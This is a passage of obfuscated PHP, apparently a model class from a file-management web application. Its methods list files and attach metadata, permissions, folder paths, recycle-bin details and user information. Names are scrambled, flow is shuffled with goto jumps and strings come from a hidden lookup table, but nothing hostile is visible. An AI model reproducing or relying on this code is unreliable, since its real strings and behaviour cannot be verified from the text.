c¹¦™Í´Ü: } protected function _listAppendFileMeta(&$c“ö©•´¢ë, $eÊ¯Àî¹÷) { goto cöğÌˆùĞğ; eËÚ…×Â¢Ó: $d—Ş§ÏŠéÍ = $d—Ş§ÏŠéÍ ? $d—Ş§ÏŠéÍ : array(); $fÃê‡”Î¢ó = array(); foreach ($d—Ş§ÏŠéÍ as $BÅ–Öäë§) { if (!isset($fÃê‡”Î¢ó[$BÅ–Öäë§[$Dù“áÑˆ¿[441]]])) { $fÃê‡”Î¢ó[$BÅ–Öäë§[$Dù“áÑˆ¿[441]]] = array(); } $fÃê‡”Î¢ó[$BÅ–Öäë§[$Dù“áÑˆ¿[441]]][$BÅ–Öäë§[$Dù“áÑˆ¿[92]]] = $BÅ–Öäë§[$Dù“áÑˆ¿[370]]; } goto FˆÉ©¨À¯õ; cÉŞÖÜ©¥: if (!$F­ÆˆÛœÀ) { return; } $Dä ÛŸËğ„ = array($Dù“áÑˆ¿[442] => array($Dù“áÑˆ¿[405], $F­ÆˆÛœÀ)); $cæöÆ‘·îå = $Dù“áÑˆ¿[443]; goto e÷âËÓàØß; FˆÉ©¨À¯õ: foreach ($c“ö©•´¢ë as &$d¢ÎÀÒ”º) { goto DŸ·³÷‡ º; F©—ÌÖö½ä: if (isset($d¢ÎÀÒ”º[$Dù“áÑˆ¿[163]][$Dù“áÑˆ¿[162]])) { $d¢ÎÀÒ”º[$Dù“áÑˆ¿[162]] = json_decode($d¢ÎÀÒ”º[$Dù“áÑˆ¿[163]][$Dù“áÑˆ¿[162]], !0); unset($d¢ÎÀÒ”º[$Dù“áÑˆ¿[163]][$Dù“áÑˆ¿[162]]); } goto cˆ„ö…Á¶; B»æËë ¦³: unset($B÷± —Š«[$DàßŞ¦¡±][$Dù“áÑˆ¿[75]]); $Fé×ÈŠ¤ğ˜ = is_array($fÃê‡”Î¢ó[$DàßŞ¦¡±]) ? $fÃê‡”Î¢ó[$DàßŞ¦¡±] : array(); $d¢ÎÀÒ”º[$Dù“áÑˆ¿[163]] = array_merge($Fé×ÈŠ¤ğ˜, $B÷± —Š«[$DàßŞ¦¡±]); goto F©—ÌÖö½ä; A‘Íá Îò: $E¬¤»ƒªí[$Dù“áÑˆ¿[77]] = $d¢ÎÀÒ”º[$Dù“áÑˆ¿[77]]; $E¬¤»ƒªí[$Dù“áÑˆ¿[28]] = $d¢ÎÀÒ”º[$Dù“áÑˆ¿[28]]; if (!isset(self::$cacheFileInfo[$Dù“áÑˆ¿[447] . $DàßŞ¦¡±])) { self::$cacheFileInfo[$Dù“áÑˆ¿[447] . $DàßŞ¦¡±] = array_merge(array(), $E¬¤»ƒªí); } goto B»æËë ¦³; DŸ·³÷‡ º: $DàßŞ¦¡± = $d¢ÎÀÒ”º[$Dù“áÑˆ¿[441]]; if (!$DàßŞ¦¡± || !is_array($B÷± —Š«[$DàßŞ¦¡±])) { continue; } $E¬¤»ƒªí = $B÷± —Š«[$DàßŞ¦¡±]; goto A‘Íá Îò; cˆ„ö…Á¶: } unset($d¢ÎÀÒ”º); goto F»•à í´Â; e÷âËÓàØß: $B÷± —Š« = Model($Dù“áÑˆ¿[444])->field($cæöÆ‘·îå)->where($Dä ÛŸËğ„)->select(); $B÷± —Š« = array_to_keyvalue($B÷± —Š«, $Dù“áÑˆ¿[441]); $d—Ş§ÏŠéÍ = Model($Dù“áÑˆ¿[445])->field($Dù“áÑˆ¿[446])->where($Dä ÛŸËğ„)->select(); goto eËÚ…×Â¢Ó; cöğÌˆùĞğ: $Dù“áÑˆ¿ =& $_SERVER[¹Ò‹Ò¹]; $F­ÆˆÛœÀ = array_to_keyvalue($c“ö©•´¢ë, $Dù“áÑˆ¿[33], $Dù“áÑˆ¿[441]); $F­ÆˆÛœÀ = array_filter(array_unique($F­ÆˆÛœÀ)); goto cÉŞÖÜ©¥; F»•à í´Â: } protected function _listAppendSourceInfo(&$cÁÀÃ…˜ùß, $dğ—™ÚˆÌÂ) { goto f·”™‘×‚ª; D¢İËóÅë»: return $cÁÀÃ…˜ùß; goto D¼àïñ©åè; FÃÈÄ’·±µ: $c¦±ª®…™‡ = Model($AŒæÀÓ‘³ã[412])->listData(); $aä²ËÃØïÜ = Model($AŒæÀÓ‘³ã[402])->listData(); $F›îËâ† = Model($AŒæÀÓ‘³ã[450])->listSimple(); goto A‚ÂÁèÃ•Ã; A‚ÂÁèÃ•Ã: $bÖâ‡ÓÂ = array_to_keyvalue($bƒåÖÜø»Ç, $AŒæÀÓ‘³ã[388]); $FªÂ×óÅÖ = array_to_keyvalue_group($c¦±ª®…™‡, $AŒæÀÓ‘³ã[75], $AŒæÀÓ‘³ã[413]); $f›‹ÑïğÎ„ = array_to_keyvalue($aä²ËÃØïÜ, $AŒæÀÓ‘³ã[75]); goto C›Áƒ˜ÁİÉ; C›Áƒ˜ÁİÉ: $aÅïßÄ±‹ = array_to_keyvalue_group($F›îËâ†, $AŒæÀÓ‘³ã[390]); foreach ($cÁÀÃ…˜ùß as &$aáëÍ¿¬—£) { $aáëÍ¿¬—£[$AŒæÀÓ‘³ã[84]] = array($AŒæÀÓ‘³ã[451] => 0, $AŒæÀÓ‘³ã[452] => 0, $AŒæÀÓ‘³ã[453] => 0); if (isset($f›‹ÑïğÎ„[$aáëÍ¿¬—£[$AŒæÀÓ‘³ã[390]]])) { $aáëÍ¿¬—£[$AŒæÀÓ‘³ã[84]][$AŒæÀÓ‘³ã[454]] = 1; $aáëÍ¿¬—£[$AŒæÀÓ‘³ã[84]][$AŒæÀÓ‘³ã[455]] = $f›‹ÑïğÎ„[$aáëÍ¿¬—£[$AŒæÀÓ‘³ã[390]]][$AŒæÀÓ‘³ã[28]]; } if (isset($FªÂ×óÅÖ[$aáëÍ¿¬—£[$AŒæÀÓ‘³ã[390]]])) { $aáëÍ¿¬—£[$AŒæÀÓ‘³ã[84]][$AŒæÀÓ‘³ã[456]] = array(); foreach ($FªÂ×óÅÖ[$aáëÍ¿¬—£[$AŒæÀÓ‘³ã[390]]] as $e¥••ÈĞŒ¸) { $AŒïÉÏå¿Ö = $bÖâ‡ÓÂ[$e¥••ÈĞŒ¸]; $aáëÍ¿¬—£[$AŒæÀÓ‘³ã[84]][$AŒæÀÓ‘³ã[456]][] = array($AŒæÀÓ‘³ã[457] => $AŒïÉÏå¿Ö[$AŒæÀÓ‘³ã[388]], $AŒæÀÓ‘³ã[407] => $AŒïÉÏå¿Ö[$AŒæÀÓ‘³ã[28]], $AŒæÀÓ‘³ã[458] => $AŒïÉÏå¿Ö[$AŒæÀÓ‘³ã[459]]); } } if (isset($aÅïßÄ±‹[$aáëÍ¿¬—£[$AŒæÀÓ‘³ã[390]]])) { $aáëÍ¿¬—£[$AŒæÀÓ‘³ã[84]][$AŒæÀÓ‘³ã[460]] = array(); foreach ($aÅïßÄ±‹[$aáëÍ¿¬—£[$AŒæÀÓ‘³ã[390]]] as $c¥†ÔÉ·÷›) { $aáëÍ¿¬—£[$AŒæÀÓ‘³ã[84]][$AŒæÀÓ‘³ã[460]] = array($AŒæÀÓ‘³ã[461] => $c¥†ÔÉ·÷›[$AŒæÀÓ‘³ã[462]], $AŒæÀÓ‘³ã[463] => $c¥†ÔÉ·÷›[$AŒæÀÓ‘³ã[464]], $AŒæÀÓ‘³ã[465] => $c¥†ÔÉ·÷›[$AŒæÀÓ‘³ã[390]], $AŒæÀÓ‘³ã[466] => $c¥†ÔÉ·÷›[$AŒæÀÓ‘³ã[467]], $AŒæÀÓ‘³ã[468] => $c¥†ÔÉ·÷›[$AŒæÀÓ‘³ã[469]], $AŒæÀÓ‘³ã[470] => $c¥†ÔÉ·÷›[$AŒæÀÓ‘³ã[470]], $AŒæÀÓ‘³ã[471] => $c¥†ÔÉ·÷›[$AŒæÀÓ‘³ã[471]]); } } } unset($aáëÍ¿¬—£); goto D¢İËóÅë»; f·”™‘×‚ª: $AŒæÀÓ‘³ã =& $_SERVER[¹Ò‹Ò¹]; if (!defined($AŒæÀÓ‘³ã[448])) { return; } $bƒåÖÜø»Ç = Model($AŒæÀÓ‘³ã[449])->listData(); goto FÃÈÄ’·±µ; D¼àïñ©åè: } protected function _listAppendChildren(&$FĞØ†ïÖâ, $Bš‰’É¡­µ) { goto A°¥Àìï; dØŸ‚¤Š²Ş: $f…ˆŠ¦àî« = array(); foreach ($fÈËéÍİÊ³ as $Bôø¸ãì©) { $Eáö÷ÄœÉ = $Bôø¸ãì©[$fÜŠ‘‰ôê‚[472]]; $aÔ•¦ŞÌÚÂ = $Bôø¸ãì©[$fÜŠ‘‰ôê‚[397]] == $fÜŠ‘‰ôê‚[86] ? $fÜŠ‘‰ôê‚[202] : $fÜŠ‘‰ôê‚[201]; if (!isset($f…ˆŠ¦àî«[$Eáö÷ÄœÉ])) { $f…ˆŠ¦àî«[$Eáö÷ÄœÉ] = array($fÜŠ‘‰ôê‚[201] => 0, $fÜŠ‘‰ôê‚[202] => 0); } $f…ˆŠ¦àî«[$Eáö÷ÄœÉ][$aÔ•¦ŞÌÚÂ] += $Bôø¸ãì©[$fÜŠ‘‰ôê‚[474]]; } foreach ($FĞØ†ïÖâ as &$D§š†Š«î‰) { if (!$D§š†Š«î‰[$fÜŠ‘‰ôê‚[397]]) { continue; } $DãÜ‘’ğ¨¬ = is_array($f…ˆŠ¦àî«[$D§š†Š«î‰[$fÜŠ‘‰ôê‚[390]]]) ? $f…ˆŠ¦àî«[$D§š†Š«î‰[$fÜŠ‘‰ôê‚[390]]] : $c¾µ†£µªÍ; $D§š†Š«î‰[$fÜŠ‘‰ôê‚[202]] = $DãÜ‘’ğ¨¬[$fÜŠ‘‰ôê‚[202]]; $D§š†Š«î‰[$fÜŠ‘‰ôê‚[201]] = $DãÜ‘’ğ¨¬[$fÜŠ‘‰ôê‚[201]]; unset($D§š†Š«î‰[$fÜŠ‘‰ôê‚[399]]); } goto E”Ş¦¦°; E”Ş¦¦°: unset($D§š†Š«î‰); goto fÛ ÌÕô; E»¿äÀ‹Üç: foreach ($FĞØ†ïÖâ as &$D§š†Š«î‰) { if (!$D§š†Š«î‰[$fÜŠ‘‰ôê‚[397]]) { continue; } $d’ê©øõ¤Ä[] = $D§š†Š«î‰[$fÜŠ‘‰ôê‚[390]]; } unset($D§š†Š«î‰); if (!$d’ê©øõ¤Ä) { return; } goto BÇö”’ˆ×š; BÇö”’ˆ×š: $aà ­×Š = array($fÜŠ‘‰ôê‚[472] => array($fÜŠ‘‰ôê‚[7], $d’ê©øõ¤Ä)); $F‡éº£ò„ø = array($fÜŠ‘‰ôê‚[472], $fÜŠ‘‰ôê‚[397], $fÜŠ‘‰ôê‚[473] => $fÜŠ‘‰ôê‚[474]); $fÈËéÍİÊ³ = $this->field($F‡éº£ò„ø)->where($aà ­×Š)->group($fÜŠ‘‰ôê‚[475])->select(); goto dØŸ‚¤Š²Ş; A°¥Àìï: $fÜŠ‘‰ôê‚ =& $_SERVER[¹Ò‹Ò¹]; $d’ê©øõ¤Ä = array(); $c¾µ†£µªÍ = array($fÜŠ‘‰ôê‚[201] => 0, $fÜŠ‘‰ôê‚[202] => 0); goto E»¿äÀ‹Üç; fÛ ÌÕô: } protected function _listAppendAuth(&$eäÜ¼Îæ‚Ú) { goto AÎ‡ä™Èíœ; b¥‘ŞŞÃİ: foreach ($eäÜ¼Îæ‚Ú as $b‡åÒğÕ¢Ö) { if ($b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[398]] == self::TYPE_GROUP) { $e‰ŒÖóÙò¹[] = $b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[390]]; } } if (!$e‰ŒÖóÙò¹) { return; } $A˜¤–»… = array_to_keyvalue($eäÜ¼Îæ‚Ú, $a“¥ã¨‹‘[390]); goto dË¹Ëº•ø; dË¹Ëº•ø: $eÎØßÔÍí = Model($a“¥ã¨‹‘[476])->getSourceList($e‰ŒÖóÙò¹, $A˜¤–»…); foreach ($eäÜ¼Îæ‚Ú as $eº§™ç† => &$b‡åÒğÕ¢Ö) { $b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[400]] = $eÎØßÔÍí[$b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[390]]]; if (!$b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[400]] && $b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[398]] == self::TYPE_GROUP) { $b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[400]] = Action($a“¥ã¨‹‘[477])->pathGroupAuthMake($b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[478]]); if (!$b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[400]] && !_get($GLOBALS, $a“¥ã¨‹‘[479])) { $b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[194]] = !1; $b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[193]] = !1; } } if ($b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[400]]) { $b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[194]] = AuthModel::authCheckEdit($b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[400]][$a“¥ã¨‹‘[401]]); $b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[193]] = AuthModel::authCheckView($b‡åÒğÕ¢Ö[$a“¥ã¨‹‘[400]][$a“¥ã¨‹‘[401]]); } $this->groupPathDisplay($b‡åÒğÕ¢Ö); } unset($b‡åÒğÕ¢Ö); goto dŞÅƒ›ƒø©; AÎ‡ä™Èíœ: $a“¥ã¨‹‘ =& $_SERVER[¹Ò‹Ò¹]; if (!defined($a“¥ã¨‹‘[448])) { return; } $e‰ŒÖóÙò¹ = array(); goto b¥‘ŞŞÃİ; dŞÅƒ›ƒø©: } public function groupPathDisplay(&$d„Ù¸ŒÙ¬Ö) { goto aÎ½°œîŒ¹; aÎ½°œîŒ¹: $EÖĞ­ÒÖºá =& $_SERVER[¹Ò‹Ò¹]; if ($d„Ù¸ŒÙ¬Ö[$EÖĞ­ÒÖºá[398]] != self::TYPE_GROUP) { return; } $BƒñƒóãÛ = Model($EÖĞ­ÒÖºá[480])->getInfo($d„Ù¸ŒÙ¬Ö[$EÖĞ­ÒÖºá[478]]); goto DÄ¼è®Ñ‚; b•†‡¹Ä¥¶: $d„Ù¸ŒÙ¬Ö[$EÖĞ­ÒÖºá[486]] = $DöŸÒÂùéô . $BƒñƒóãÛ[$EÖĞ­ÒÖºá[84]][$EÖĞ­ÒÖºá[390]]; goto c°†Áïö; eÇĞ‰ÓšéÊ: $d„Ù¸ŒÙ¬Ö[$EÖĞ­ÒÖºá[482]] = $BƒñƒóãÛ[$EÖĞ­ÒÖºá[472]]; $d„Ù¸ŒÙ¬Ö[$EÖĞ­ÒÖºá[483]] = $BƒñƒóãÛ[$EÖĞ­ÒÖºá[481]]; $d„Ù¸ŒÙ¬Ö[$EÖĞ­ÒÖºá[484]] = $BƒñƒóãÛ[$EÖĞ­ÒÖºá[485]]; goto b•†‡¹Ä¥¶; DÄ¼è®Ñ‚: $cˆ²ŞƒŸŞĞ = $this->parentLevelArray($BƒñƒóãÛ[$EÖĞ­ÒÖºá[481]]); $DöŸÒÂùéô = $EÖĞ­ÒÖºá[33]; foreach ($cˆ²ŞƒŸŞĞ as $eå·ğÙ–ÚÏ) { $aËÅ„ËÛ˜Ì = Model($EÖĞ­ÒÖºá[480])->getInfo($eå·ğÙ–ÚÏ); $DöŸÒÂùéô .= $aËÅ„ËÛ˜Ì[$EÖĞ­ÒÖºá[84]][$EÖĞ­ÒÖºá[390]] . $EÖĞ­ÒÖºá[47]; } goto eÇĞ‰ÓšéÊ; c°†Áïö: } protected function _listAppendPath(&$f„¸¼ª) { goto Bå›ïˆßÊ; Bå›ïˆßÊ: $dÈ¸»³·Ñí =& $_SERVER[¹Ò‹Ò¹]; static $eİÛÎÁÎ÷ = array(); $c·ˆÍŒäˆ• = array(); goto E¶Œ¢ã²†µ; E¶Œ¢ã²†µ: $c†í­Êá“¶ = array(); foreach ($f„¸¼ª as &$f’ù‰óÚèµ) { $cÔÄ×ó³Ç = $f’ù‰óÚèµ[$dÈ¸»³·Ñí[397]] == $dÈ¸»³·Ñí[86]; if ($cÔÄ×ó³Ç) { $eİÛÎÁÎ÷[$f’ù‰óÚèµ[$dÈ¸»³·Ñí[390]]] = $f’ù‰óÚèµ[$dÈ¸»³·Ñí[28]]; } if (isset($c†í­Êá“¶[$f’ù‰óÚèµ[$dÈ¸»³·Ñí[481]]])) { continue; } $c†í­Êá“¶[$f’ù‰óÚèµ[$dÈ¸»³·Ñí[481]]] = !0; $fÙòäÍ‰øî = $this->parentLevelArray($f’ù‰óÚèµ[$dÈ¸»³·Ñí[481]]); foreach ($fÙòäÍ‰øî as $e¾¸ª‰ù¥ï => $Aä³Œ•É) { if ($e¾¸ª‰ù¥ï != 0 && !isset($eİÛÎÁÎ÷[$Aä³Œ•É])) { $c·ˆÍŒäˆ•[] = $Aä³Œ•É; } } } unset($f’ù‰óÚèµ); goto BİÛãÂ‹‚¶; BİÛãÂ‹‚¶: $c·ˆÍŒäˆ• = array_unique($c·ˆÍŒäˆ•); if (count($c·ˆÍŒäˆ•) > 0) { $C¹àØÙ˜°¸ = array($dÈ¸»³·Ñí[404] => array($dÈ¸»³·Ñí[405], $c·ˆÍŒäˆ•)); if (count($c·ˆÍŒäˆ•) == 1) { $C‰îŠ–°ò¬ = $this->sourceInfo($c·ˆÍŒäˆ•[0]); $CœÅ†ê›ßÕ = is_array($C‰îŠ–°ò¬) ? array($C‰îŠ–°ò¬) : !1; } else { $CœÅ†ê›ßÕ = $this->field($dÈ¸»³·Ñí[487])->where($C¹àØÙ˜°¸)->select(); } if (!$CœÅ†ê›ßÕ) { $CœÅ†ê›ßÕ = array(); } foreach ($CœÅ†ê›ßÕ as $b¼‡—ë÷ó) { $eİÛÎÁÎ÷[$b¼‡—ë÷ó[$dÈ¸»³·Ñí[390]]] = $b¼‡—ë÷ó[$dÈ¸»³·Ñí[28]]; } } $eÆ‡é’¼›• = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto Fæ¥µÂ¾Ï®; Fæ¥µÂ¾Ï®: $Eª¦—©»æ = array(); $a¥…ŠîÌ«¬ = array(); foreach ($f„¸¼ª as &$f’ù‰óÚèµ) { goto A½È–ó÷Üç; aì¤õà¥ˆî: if (intval($f’ù‰óÚèµ[$dÈ¸»³·Ñí[398]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($f’ù‰óÚèµ, $fÙòäÍ‰øî, $eÆ‡é’¼›•); } goto aÔöÄíØÂ‹; CÁö‰êõ”˜: $f’ù‰óÚèµ[$dÈ¸»³·Ñí[489]] = str_replace($dÈ¸»³·Ñí[490], $dÈ¸»³·Ñí[8], $Bë¿ê«Çöñ); $f¡²Ïöº» = trim($f’ù‰óÚèµ[$dÈ¸»³·Ñí[489]], $dÈ¸»³·Ñí[8]); if ($f’ù‰óÚèµ[$dÈ¸»³·Ñí[472]] == $dÈ¸»³·Ñí[491] && $f¡²Ïöº») { $f’ù‰óÚèµ[$dÈ¸»³·Ñí[28]] = $f¡²Ïöº»; } goto aì¤õà¥ˆî; A½È–ó÷Üç: $FÛ¤¸‘éîŠ = $f’ù‰óÚèµ[$dÈ¸»³·Ñí[481]]; if (isset($a¥…ŠîÌ«¬[$FÛ¤¸‘éîŠ])) { $Bë¿ê«Çöñ = $Eª¦—©»æ[$FÛ¤¸‘éîŠ]; } else { $fÙòäÍ‰øî = $this->parentLevelArray($f’ù‰óÚèµ[$dÈ¸»³·Ñí[481]]); $D¾¸œš÷ê‰ = $dÈ¸»³·Ñí[488] . $f’ù‰óÚèµ[$dÈ¸»³·Ñí[398]] . $dÈ¸»³·Ñí[434] . $f’ù‰óÚèµ[$dÈ¸»³·Ñí[478]]; if ($Eª¦—©»æ[$D¾¸œš÷ê‰]) { $Bë¿ê«Çöñ = $Eª¦—©»æ[$D¾¸œš÷ê‰]; } else { $Bë¿ê«Çöñ = $this->_listAppendPathRoot($f’ù‰óÚèµ, $fÙòäÍ‰øî); $Eª¦—©»æ[$D¾¸œš÷ê‰] = $Bë¿ê«Çöñ; } foreach ($fÙòäÍ‰øî as $e¾¸ª‰ù¥ï => $Aä³Œ•É) { if ($e¾¸ª‰ù¥ï == 0 && $Bë¿ê«Çöñ && $f’ù‰óÚèµ[$dÈ¸»³·Ñí[398]] == self::TYPE_GROUP) { continue; } if (isset($eİÛÎÁÎ÷[$Aä³Œ•É])) { $Bë¿ê«Çöñ .= $eİÛÎÁÎ÷[$Aä³Œ•É] . $dÈ¸»³·Ñí[8]; } } if ($fÙòäÍ‰øî) { $Bë¿ê«Çöñ .= $f’ù‰óÚèµ[$dÈ¸»³·Ñí[28]]; } $Eª¦—©»æ[$FÛ¤¸‘éîŠ] = $Bë¿ê«Çöñ; } if ($f’ù‰óÚèµ[$dÈ¸»³·Ñí[397]]) { $Bë¿ê«Çöñ .= $dÈ¸»³·Ñí[8]; } goto CÁö‰êõ”˜; aÔöÄíØÂ‹: } goto EŒæ™®å‰¨; EŒæ™®å‰¨: unset($f’ù‰óÚèµ); return $f„¸¼ª; goto d»”¢êáôµ; d»”¢êáôµ: } private function _listAppendPathRecycle(&$AğÒ …¸, $Dç—¶á÷¥, $d‹’ç¬·”†) { goto D¾Ë¡Å„…°; BØçáäŒ±³: $CÕíìŠ“ = implode($D·ËÊğ»Í¤[8], array_slice($aéÕË†œš³, 2)); $AğÒ …¸[$D·ËÊğ»Í¤[489]] = $D·ËÊğ»Í¤[8] . LNG($D·ËÊğ»Í¤[492]) . $D·ËÊğ»Í¤[8] . ltrim($CÕíìŠ“, $D·ËÊğ»Í¤[8]); $AğÒ …¸[$D·ËÊğ»Í¤[481]] = $D·ËÊğ»Í¤[493] . implode($D·ËÊğ»Í¤[47], array_slice($Dç—¶á÷¥, 1)) . $D·ËÊğ»Í¤[47]; goto dØöç°„·; dØöç°„·: if ($AğÒ …¸[$D·ËÊğ»Í¤[390]] == $d‹’ç¬·”†) { $AğÒ …¸[$D·ËÊğ»Í¤[481]] = $D·ËÊğ»Í¤[493]; $AğÒ …¸[$D·ËÊğ»Í¤[472]] = $D·ËÊğ»Í¤[491]; $AğÒ …¸[$D·ËÊğ»Í¤[28]] = LNG($D·ËÊğ»Í¤[492]); } $AğÒ …¸[$D·ËÊğ»Í¤[494]] = $D·ËÊğ»Í¤[495]; goto a²Äó‚¦Ï¶; D¾Ë¡Å„…°: $D·ËÊğ»Í¤ =& $_SERVER[¹Ò‹Ò¹]; if (!in_array($d‹’ç¬·”†, $Dç—¶á÷¥) && $AğÒ …¸[$D·ËÊğ»Í¤[390]] != $d‹’ç¬·”†) { return; } $aéÕË†œš³ = explode($D·ËÊğ»Í¤[8], trim($AğÒ …¸[$D·ËÊğ»Í¤[489]], $D·ËÊğ»Í¤[8])); goto BØçáäŒ±³; a²Äó‚¦Ï¶: } protected function _listAppendPathRoot(&$eÆáì¼±£­, $b´Æ–Â…) { $f‚‚šÚµ‹Ÿ =& $_SERVER[¹Ò‹Ò¹]; $Aê«ˆØ™øÆ = $f‚‚šÚµ‹Ÿ[33]; if ($eÆáì¼±£­[$f‚‚šÚµ‹Ÿ[398]] == self::TYPE_USER) { if (defined($f‚‚šÚµ‹Ÿ[448]) && $eÆáì¼±£­[$f‚‚šÚµ‹Ÿ[478]] == USER_ID) { $Aê«ˆØ™øÆ = LNG($f‚‚šÚµ‹Ÿ[496]); if (!$b´Æ–Â…) { $eÆáì¼±£­[$f‚‚šÚµ‹Ÿ[28]] = $Aê«ˆØ™øÆ; } } else { $c¸ƒÉ•´É¿ = Model($f‚‚šÚµ‹Ÿ[497])->getInfoSimple($eÆáì¼±£­[$f‚‚šÚµ‹Ÿ[478]]); $Aê«ˆØ™øÆ = LNG($f‚‚šÚµ‹Ÿ[498]) . $f‚‚šÚµ‹Ÿ[159] . $c¸ƒÉ•´É¿[$f‚‚šÚµ‹Ÿ[28]] . $f‚‚šÚµ‹Ÿ[499]; } } else { if ($eÆáì¼±£­[$f‚‚šÚµ‹Ÿ[398]] == self::TYPE_GROUP) { $c¸ƒÉ•´É¿ = Model($f‚‚šÚµ‹Ÿ[480])->getInfoSimple($eÆáì¼±£­[$f‚‚šÚµ‹Ÿ[478]]); $Aê«ˆØ™øÆ = $c¸ƒÉ•´É¿[$f‚‚šÚµ‹Ÿ[28]]; } else { if ($eÆáì¼±£­[$f‚‚šÚµ‹Ÿ[398]] == self::TYPE_SYSTEM) { $Aê«ˆØ™øÆ = $f‚‚šÚµ‹Ÿ[500]; } } } $Aê«ˆØ™øÆ = $Aê«ˆØ™øÆ ? $f‚‚šÚµ‹Ÿ[8] . $Aê«ˆØ™øÆ . $f‚‚šÚµ‹Ÿ[8] : $f‚‚šÚµ‹Ÿ[8]; return $Aê«ˆØ™øÆ; } protected function _listAppendUser(&$eµİ…ÈÉ…) { goto CáÏåØĞò; d‚ö›©²×¿: unset($f©ùÛƒ¨›); goto e¯¶‘èĞ·†; D÷­Ù“Ú´Ã: $fîœÈŠ‹ = array_merge($Cˆ³äö™¯æ, $a×Åİ’¤¬Ú); $fºÏö×áôÒ = Model($AªÆ›±µë[501])->userListInfo($fîœÈŠ‹); foreach ($eµİ…ÈÉ… as &$f©ùÛƒ¨›) { $fé®ÔœèÑœ = $f©ùÛƒ¨›[$AªÆ›±µë[426]]; $f©ùÛƒ¨›[$AªÆ›±µë[426]] = $fºÏö×áôÒ[$fé®ÔœèÑœ] ? $fºÏö×áôÒ[$fé®ÔœèÑœ] : !1; $fé®ÔœèÑœ = $f©ùÛƒ¨›[$AªÆ›±µë[428]]; $f©ùÛƒ¨›[$AªÆ›±µë[428]] = $fºÏö×áôÒ[$fé®ÔœèÑœ] ? $fºÏö×áôÒ[$fé®ÔœèÑœ] : !1; if (isset($f©ùÛƒ¨›[$AªÆ›±µë[439]]) && $f©ùÛƒ¨›[$AªÆ›±µë[439]][$AªÆ›±µë[502]]) { $a‡ùÖ¥ä—õ = $GLOBALS[$AªÆ›±µë[6]][$AªÆ›±µë[87]][$AªÆ›±µë[503]]; if ($f©ùÛƒ¨›[$AªÆ›±µë[439]][$AªÆ›±µë[504]] <= time() - $a‡ùÖ¥ä—õ) { $this->metaSet($f©ùÛƒ¨›[$AªÆ›±µë[390]], $AªÆ›±µë[502], null); $this->metaSet($f©ùÛƒ¨›[$AªÆ›±µë[390]], $AªÆ›±µë[504], null); unset($f©ùÛƒ¨›[$AªÆ›±µë[439]][$AªÆ›±µë[502]]); continue; } $b÷†™¬¥ä¡ = $f©ùÛƒ¨›[$AªÆ›±µë[439]][$AªÆ›±µë[502]]; $f©ùÛƒ¨›[$AªÆ›±µë[439]][$AªÆ›±µë[505]] = Model($AªÆ›±µë[501])->getInfoSimpleOuter($b÷†™¬¥ä¡); } } goto d‚ö›©²×¿; CáÏåØĞò: $AªÆ›±µë =& $_SERVER[¹Ò‹Ò¹]; $Cˆ³äö™¯æ = array_to_keyvalue($eµİ…ÈÉ…, $AªÆ›±µë[33], $AªÆ›±µë[426]); $a×Åİ’¤¬Ú = array_to_keyvalue($eµİ…ÈÉ…, $AªÆ›±µë[33], $AªÆ›±µë[428]); goto D÷­Ù“Ú´Ã; e¯¶‘èĞ·†: } public function parentLevelArray($b¯ìŒÇÕ«„) { $B¨›®«™Æ¤ =& $_SERVER[¹Ò‹Ò¹]; $b¯ìŒÇÕ«„ = explode($B¨›®«™Æ¤[47], trim($b¯ìŒÇÕ«„, $B¨›®«™Æ¤[47])); return array_remove_value($b¯ìŒÇÕ«„, $B¨›®«™Æ¤[491]); } public function listAll($dæõ¬µµÏ¾) { goto c¹×ÌË¼ø’; Dì†š ëÌ„: $A›ƒ°ƒÎÌ = array_to_keyvalue($A›ƒ°ƒÎÌ, $bëÕÂ¦®¥[390]); $D™ÁÎÄ = "\57{$f¡—Â•ƒ°[$bëÕÂ¦®¥[28]]}\57"; $D™ÁÎÄ = $D™ÁÎÄ == $bëÕÂ¦®¥[490] ? $bëÕÂ¦®¥[8] : $D™ÁÎÄ; goto Eê”šÜ¸; FŞ¼Ğ­äÇ´: $B½Ò°çé»¢ = $bëÕÂ¦®¥[510]; $eÈ“¾ª©½« = "\x4c\x45\x46\x54\x20\x4a\117\x49\116\x20{$this->tablePrefix}\151\157\x5f\x66\x69\154\145\x20\146\x69\x6c\x65\40\157\156\40\163\157\x75\162\x63\x65\56\146\x69\154\x65\111\104\40\x3d\40\146\151\154\145\x2e\146\151\x6c\x65\111\x44"; $A›ƒ°ƒÎÌ = $this->alias($bëÕÂ¦®¥[511])->field($B½Ò°çé»¢)->where($eøíõË´§)->join($eÈ“¾ª©½«)->select(); goto e†¦—­™–; c¹×ÌË¼ø’: $bëÕÂ¦®¥ =& $_SERVER[¹Ò‹Ò¹]; $f¡—Â•ƒ° = $this->sourceInfo($dæõ¬µµÏ¾); $eøíõË´§ = array($bëÕÂ¦®¥[506] => array($bëÕÂ¦®¥[507], $f¡—Â•ƒ°[$bëÕÂ¦®¥[481]] . $dæõ¬µµÏ¾ . $bëÕÂ¦®¥[508]), $bëÕÂ¦®¥[509] => 0); goto FŞ¼Ğ­äÇ´; Eê”šÜ¸: $D¥Ğ¿ªÄ¼ä = array(); foreach ($A›ƒ°ƒÎÌ as $FË¬½ñøÌ => $b†¤Ó£Ô¨â) { goto eöà¢Í„ÎÎ; cøÊïàºÇ: for ($A´ÛÔÈå‘¼ = 0; $A´ÛÔÈå‘¼ < count($AÕŒï–ÍàÁ); $A´ÛÔÈå‘¼++) { $FÈˆéÔŠ‡ .= $A›ƒ°ƒÎÌ[$AÕŒï–ÍàÁ[$A´ÛÔÈå‘¼]][$bëÕÂ¦®¥[28]] . $bëÕÂ¦®¥[8]; } $FÈˆéÔŠ‡ .= 